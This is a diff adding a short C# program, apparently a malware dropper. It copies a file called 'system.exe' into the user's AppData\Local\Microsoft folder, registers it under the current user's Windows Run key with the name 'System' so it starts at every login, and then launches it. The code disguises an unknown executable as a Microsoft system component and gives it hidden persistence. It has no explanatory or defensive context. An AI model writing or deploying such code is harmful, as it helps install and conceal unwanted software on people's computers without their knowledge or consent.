@@ -1,0 +1,35 @@
+using System;
+using System.Windows.Forms;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+
+using Microsoft.Win32;
+
+namespace sistemlebasla
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string filename = "system.exe";
+            string kaynakdizin = Application.StartupPath;
+            string hedefdizin = @"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Microsoft\\";
+            string kaynakdosya = System.IO.Path.Combine(kaynakdizin, filename);
+            string hedefdosya = System.IO.Path.Combine(hedefdizin, filename);
+            if (!System.IO.Directory.Exists(hedefdizin))
+            {
+                System.IO.Directory.CreateDirectory(hedefdizin);
+            }
+            System.IO.File.Copy(kaynakdosya, hedefdosya, true);
+
+            RegistryKey masterkey = Registry.CurrentUser.CreateSubKey("software").CreateSubKey("microsoft").CreateSubKey("windows").CreateSubKey("currentversion").CreateSubKey("run");
+            masterkey.SetValue("System", "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Microsoft\\system.exe -slient");
+
+            Process.Start(@"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Microsoft\\system.exe");
+            
+
+        }
+    }
+}
